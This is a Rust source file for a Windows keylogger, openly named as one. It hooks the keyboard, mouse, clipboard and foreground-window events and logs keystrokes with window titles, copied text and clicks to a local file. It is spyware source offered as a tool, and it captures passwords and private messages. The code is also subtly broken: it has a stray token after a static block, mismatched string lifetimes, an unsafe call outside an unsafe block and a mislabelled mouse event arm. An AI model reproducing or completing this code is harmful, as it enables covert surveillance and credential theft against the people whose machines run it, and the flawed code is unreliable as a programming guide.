use std::collections::HashMap;
use winapi::shared::windef::HWINEVENTHOOK__;
use std::ffi::OsStr;
use std::fs::OpenOptions;
use std::io::{Write, BufWriter};
use std::sync::{Once, Mutex};
use lazy_static::lazy_static;
use winapi::um::winuser::{
    CallNextHookEx, GetAsyncKeyState, GetForegroundWindow, GetWindowTextW, SetWindowsHookExW,
    TranslateMessage, DispatchMessageW, GetMessageW, WH_KEYBOARD_LL, WH_MOUSE_LL, WM_KEYDOWN,
    WM_LBUTTONDOWN, WM_LBUTTONUP, WM_RBUTTONDOWN, WM_RBUTTONUP, MSLLHOOKSTRUCT, KBDLLHOOKSTRUCT,
    PostQuitMessage, MessageBoxW, CreateWindowExW, SetWindowLongPtrW, DestroyWindow, AddClipboardFormatListener,
    RemoveClipboardFormatListener, IsClipboardFormatAvailable, OpenClipboard, GetClipboardData, CloseClipboard,
    CallWindowProcW, UnhookWinEvent, SetWinEventHook,

};
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM, UINT};
use winapi::shared::windef::{HHOOK, HWND, POINT};
use winapi::ctypes::c_int;
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::winbase::{GlobalLock, GlobalUnlock};
use winapi::um::winuser::MapVirtualKeyA;
use std::os::windows::ffi::OsStrExt;



lazy_static! {
    static ref KEY_NAME: HashMap<i32, &'static str> = {
        let mut map = HashMap::new();

        // Basic Keys
        map.insert(0x08, "[BACKSPACE]");
        map.insert(0x09, "[TAB]");
        map.insert(0x0D, "\n");
        map.insert(0x20, " ");
        map.insert(0x1B, "[ESCAPE]");

        // Function Keys
        for i in 0x70..=0x7B {
            map.insert(i, &format!("[F{}]", i - 0x6F));
        }

        // Navigation Keys
        map.insert(0x21, "[PG_UP]");
        map.insert(0x22, "[PG_DOWN]");
        map.insert(0x23, "[END]");
        map.insert(0x24, "[HOME]");
        map.insert(0x25, "[LEFT]");
        map.insert(0x26, "[UP]");
        map.insert(0x27, "[RIGHT]");
        map.insert(0x28, "[DOWN]");

        // Modifier Keys
        map.insert(0x10, "[SHIFT]");
        map.insert(0xA0, "[LSHIFT]");
        map.insert(0xA1, "[RSHIFT]");
        map.insert(0x11, "[CONTROL]");
        map.insert(0xA2, "[LCONTROL]");
        map.insert(0xA3, "[RCONTROL]");
        map.insert(0x12, "[ALT]");
        map.insert(0x5B, "[LWIN]");
        map.insert(0x5C, "[RWIN]");

        // Special Keys
        map.insert(0x14, "[CAPSLOCK]");
        map.insert(0x90, "[NUMLOCK]");
        map.insert(0x91, "[SCROLLLOCK]");

        // Letters A-Z
        for i in 0x41..=0x5A { // A-Z
            map.insert(i, &char::from_u32(i as u32).unwrap().to_string());
        }

        map
    };

    static ref OUTPUT_FILE: Mutex<BufWriter<std::fs::File>> = {
        let file = OpenOptions::new()
            .append(true)
            .create(true)
            .open("keylogger.log")
            .expect("Failed to open log file");
        Mutex::new(BufWriter::new(file))
    };HWINEVENTHOOK

    static ref MOUSE_HOOK: Mutex<Option<HHOOK>> = Mutex::new(None);
    static ref WIN_EVENT_HOOK: Mutex<Option<HWINEVENTHOOK>> = Mutex::new(None);
    static ref CLIPBOARD_WINDOW: Mutex<Option<HWND>> = Mutex::new(None);
}

static INIT: Once = Once::new();

unsafe extern "system" fn hook_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 && w_param == WM_KEYDOWN as usize {
        let kbd_struct: *const KBDLLHOOKSTRUCT = l_param as *const KBDLLHOOKSTRUCT;
        let vk_code = (*kbd_struct).vkCode;
        save(vk_code as i32);
    }
    CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
}
const VAL: usize = WM_LBUTTONDOWN as usize;
const VAL_RBUTTONDOWN: usize = WM_RBUTTONDOWN as usize;
const VAL_RBUTTONUP: usize = WM_RBUTTONUP as usize;

const DEFAULT_WINDOW_PROC: *mut winapi::um::winuser::WNDPROC = std::ptr::null_mut();


unsafe extern "system" fn mouse_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 {
        let mouse_struct: *const MSLLHOOKSTRUCT = l_param as *const MSLLHOOKSTRUCT;
        match w_param {
            val if val == WM_LBUTTONDOWN as usize => save_mouse_event("Left Mouse Button Down", (*mouse_struct).pt),
            val if val == WM_LBUTTONUP as usize => save_mouse_event("Left Mouse Button Up", (*mouse_struct).pt),
            val if val == WM_RBUTTONDOWN as usize => save_mouse_event("Right Mouse Button Down", (*mouse_struct).pt),
            val if val == WM_RBUTTONUP as usize => save_mouse_event("Right Mouse Button Up", (*mouse_struct).pt),
            VAL => save_mouse_event("Right Mouse Button Up", (*mouse_struct).pt),
            _ => {}
        }
    }
    CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
}

fn save_mouse_event(event_type: &str, position: POINT) {
    let output = format!("[Mouse Event] {} at ({}, {})\n", event_type, position.x, position.y);
    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
}

unsafe extern "system" fn clipboard_window_proc(
    hwnd: HWND,
    msg: UINT,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if msg == winapi::um::winuser::WM_CLIPBOARDUPDATE {
        save_clipboard_content();
    }
    CallWindowProcW(DEFAULT_WINDOW_PROC, hwnd, msg, w_param, l_param)
}

fn save_clipboard_content() {
    unsafe {
        if IsClipboardFormatAvailable(winapi::um::winuser::CF_TEXT) != 0 {
            if OpenClipboard(std::ptr::null_mut()) != 0 {
                let data = GetClipboardData(winapi::um::winuser::CF_TEXT);
                if !data.is_null() {
                    let text = GlobalLock(data) as *const i8;
                    if !text.is_null() {
                        let c_str = std::ffi::CStr::from_ptr(text);
                        let content = c_str.to_string_lossy().into_owned();
                        GlobalUnlock(data);

                        let output = format!("[Clipboard Update] {}\n", content);
                        if let Ok(mut file) = OUTPUT_FILE.lock() {
                            writeln!(file, "{}", output).expect("Failed to write to file");
                            file.flush().expect("Failed to flush file");
                        }
                    }
                }
                CloseClipboard();
            }
        }
    }
}

unsafe extern "system" fn win_event_callback(
    h_winevent_hook: *mut HWINEVENTHOOK__,
    event: u32,
    hwnd: HWND,
    _id_object: i32,
    _id_child: i32,
    _dw_event_thread: u32,
    _dwms_event_time: u32,
) {
    if event == winapi::um::winuser::EVENT_SYSTEM_FOREGROUND {
        let mut window_title: [u16; 256] = [0; 256];
        GetWindowTextW(hwnd, window_title.as_mut_ptr(), 256);
        let title = String::from_utf16_lossy(&window_title);

        let output = format!("[Window Switch] {}\n", title.trim_end_matches('\0'));
        if let Ok(mut file) = OUTPUT_FILE.lock() {
            writeln!(file, "{}", output).expect("Failed to write to file");
            file.flush().expect("Failed to flush file");
        }
    }
}

fn save(key_stroke: i32) {
    let mut output = String::new();

    unsafe {
        let foreground = GetForegroundWindow();
        let mut window_title: [u16; 256] = [0; 256];
        GetWindowTextW(foreground, window_title.as_mut_ptr(), 256);
        let window_title = String::from_utf16_lossy(&window_title);

        if !window_title.is_empty() {
            output.push_str(&format!("\n\n[Window: {}]", window_title));
        }
    }

    let key_str = match KEY_NAME.get(&key_stroke) {
        Some(name) => name.to_string(),
        None => unsafe {
            let caps_lock_on = GetAsyncKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001 != 0;
            let shift_pressed = GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) < 0;
            let uppercase = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);

            let char_code = MapVirtualKeyA(key_stroke as u32, winapi::um::winuser::MAPVK_VK_TO_CHAR) as u8;
            let char = char::from(char_code);

            if char.is_ascii_alphabetic() {
                if uppercase {
                    char.to_ascii_uppercase().to_string()
                } else {
                    char.to_ascii_lowercase().to_string()
                }
            } else {
                format!("[{:X}]", key_stroke)
            }
        },
    };

    output.push_str(&key_str);

    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
}

fn set_hooks() {
    INIT.call_once(|| {
        let module_handle = GetModuleHandleW(std::ptr::null_mut());

        // Keyboard Hook
        let keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), module_handle, 0);
        if keyboard_hook.is_null() {
            panic!("Failed to install keyboard hook!");
        }

        // Mouse Hook
        let mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_callback), module_handle, 0);
        *MOUSE_HOOK.lock().unwrap() = Some(mouse_hook);
        if mouse_hook.is_null() {
            panic!("Failed to install mouse hook!");
        }

        // Clipboard Listener
        let hwnd = CreateWindowExW(
            0,
            OsStr::new("STATIC").encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            std::ptr::null_mut(),
            winapi::um::winuser::WS_OVERLAPPEDWINDOW,
            0, 0, 0, 0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            GetModuleHandleW(std::ptr::null_mut()),
            std::ptr::null_mut(),
        );
        *CLIPBOARD_WINDOW.lock().unwrap() = Some(hwnd);
        SetWindowLongPtrW(hwnd, winapi::um::winuser::GWLP_WNDPROC, clipboard_window_proc as *const () as isize);
        AddClipboardFormatListener(hwnd);

        // Window Switch Hook
        let win_event_hook = SetWinEventHook(
            winapi::um::winuser::EVENT_SYSTEM_FOREGROUND,
            winapi::um::winuser::EVENT_SYSTEM_FOREGROUND,
            std::ptr::null_mut(),
            Some(win_event_callback),
            0,
            0,
            winapi::um::winuser::WINEVENT_OUTOFCONTEXT,
        );
        *WIN_EVENT_HOOK.lock().unwrap() = Some(win_event_hook);
        if win_event_hook.is_null() {
            panic!("Failed to install window switch hook!");
        }
    });
}

fn release_hooks() {
    unsafe {
        if let Some(hook) = MOUSE_HOOK.lock().unwrap().take() {
            winapi::um::winuser::UnhookWindowsHookEx(hook);
        }
        if let Some(hwnd) = CLIPBOARD_WINDOW.lock().unwrap().take() {
            RemoveClipboardFormatListener(hwnd);
            DestroyWindow(hwnd);
        }
        if let Some(hook) = WIN_EVENT_HOOK.lock().unwrap().take() {
            UnhookWinEvent(hook);
        }
    }
}

fn main() {
    set_hooks();

    notify_startup(); // Notify startup

    let mut msg = unsafe { std::mem::zeroed() };
    while unsafe { GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) } != 0 {
        unsafe {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    release_hooks();
}

fn notify_startup() {
    unsafe {
        let message = "Keylogger has started.".encode_utf16().chain(Some(0)).collect::<Vec<u16>>();
        let title = "Program Started".encode_utf16().chain(Some(0)).collect::<Vec<u16>>();
        MessageBoxW(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            winapi::um::winuser::MB_OK | winapi::um::winuser::MB_ICONINFORMATION,
        );
    }
}